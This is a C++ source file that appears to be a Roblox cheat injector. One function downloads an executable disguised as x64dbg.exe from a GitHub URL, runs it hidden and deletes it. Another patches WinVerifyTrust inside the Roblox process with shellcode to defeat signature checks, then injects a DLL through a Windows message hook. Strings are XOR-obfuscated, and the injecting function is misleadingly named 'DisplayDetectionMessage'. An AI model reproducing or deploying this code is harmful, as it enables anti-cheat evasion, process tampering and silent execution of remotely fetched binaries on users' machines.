#include "hyperionutils.h"

bool TriggerHyperion() {
    std::wstring url = XorStrW(L"https://github.com/ModuleFlags/HypTriggerUtils/raw/refs/heads/main/x64dbg.exe");
    wchar_t tempDir[MAX_PATH];
    if (GetTempPath(MAX_PATH, tempDir) == 0) {
        std::wcerr << XorStrW(L"Error retrieving the temporary directory.") << std::endl;
        return false;
    }

    std::wstring filePath = std::wstring(tempDir) + XorStrW(L"x64dbg.exe");

    HRESULT result = URLDownloadToFileW(NULL, url.c_str(), filePath.c_str(), 0, NULL);

    if (result != S_OK) {
        std::wcerr << XorStrW(L"Error downloading file.") << std::endl;
        return false;
    }

    STARTUPINFO si = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = { 0 };

    if (CreateProcessW(
        filePath.c_str(),
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (DeleteFileW(filePath.c_str())) {
        }
        else {
        }

        return true;
    }
    else {
        std::wcerr << XorStrW(L"Error creating process.") << std::endl;
        return false;
    }
}
DWORD GetRobloxPID() {
    DWORD pid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << XorStr("Failed to create process snapshot. Error: ") << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, XorStrW(L"RobloxPlayerBeta.exe")) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    else {
        std::cerr << XorStr("Failed to enumerate processes. Error: ") << GetLastError() << std::endl;
    }

    CloseHandle(snapshot);
    return pid;
}

DWORD GetRobloxCrashHandlerPID() {
    DWORD pid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << XorStr("Failed to create process snapshot. Error: ") << GetLastError() << std::endl;
        return 0;
    }

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, XorStrW(L"RobloxCrashHandler.exe")) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    else {
        std::cerr << XorStr("Failed to enumerate processes. Error: ") << GetLastError() << std::endl;
    }

    CloseHandle(snapshot);
    return pid;
}

bool DisplayDetectionMessage() {

    DWORD processId = GetRobloxPID();
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    if (processHandle == NULL) {
        std::cerr << XorStr("Failed to open process.") << std::endl;
        abort();
        return false;
        //return false;
    }

    HMODULE wintrustModule = LoadLibraryA(XorStr("wintrust.dll"));
    if (wintrustModule == NULL) {
        std::cerr << XorStr("Failed to load wintrust.dll") << std::endl;
        abort();
        return false;
    }

    FARPROC _WinVerifyTrust = GetProcAddress(wintrustModule, XorStr("WinVerifyTrust"));
    if (_WinVerifyTrust == NULL) {
        std::cerr << XorStr("Failed to get WinVerifyTrust address.") << std::endl;
        abort();
        return false;
    }

    unsigned char payload[6] = {
        0x48, 0x31, 0xC0,  // xor rax, rax     ; RAX = 0
        0x59,              // pop rcx          ; RCX = [rsp], rsp += 8
        0xFF, 0xE1         // jmp rcx          ; jump to the address in RCX
    };

    DWORD oldProtect;
    if (!VirtualProtectEx(processHandle, (LPVOID)_WinVerifyTrust, sizeof(payload), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << XorStr("Failed to protect WinVerifyTrust. (Did you run twice??)") << std::endl;
        return false;
    }

    std::cout << XorStr("New protection: PAGE_EXECUTE_READWRITE.") << std::endl;

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(processHandle, (LPVOID)_WinVerifyTrust, payload, sizeof(payload), &bytesWritten)) {
        std::cerr << XorStr("Failed to patch WinVerifyTrust.") << std::endl;
        return false;
    }

    if (!VirtualProtectEx(processHandle, (LPVOID)_WinVerifyTrust, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << XorStr("Failed to protect WinVerifyTrust.") << std::endl;
        return false;
    }

    std::cout << XorStr("New protection: PAGE_EXECUTE_READ.") << std::endl;

    DWORD threadId = GetWindowThreadProcessId(FindWindowA(NULL, XorStr("Roblox")), &processId);
    if (threadId == 0) {
        std::cerr << XorStr("Window thread ID is invalid.") << std::endl;
        return false;
    }

    HMODULE targetModule = LoadLibraryExA("compiler.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!targetModule) {
        std::cerr << XorStr("Failed to find module.") << std::endl;
        return false;
    }

    FARPROC dllExport = GetProcAddress(targetModule, XorStr("NextHook"));
    if (!dllExport) {
        std::cerr << XorStr("Failed to find module hook.") << std::endl;
        return false;
    }

    HHOOK hookHandle = SetWindowsHookExA(WH_GETMESSAGE, (HOOKPROC)dllExport, targetModule, threadId);
    if (!hookHandle) {
        std::cerr << XorStr("Module hook failed.") << std::endl;
        return false;
    }

    if (!PostThreadMessage(threadId, WM_NULL, 0, 0)) {
        std::cerr << XorStr("Failed to post thread message.") << std::endl;
        return false;
    }

    std::cout << XorStr("Module attached successfully.") << std::endl;
    return true;
}
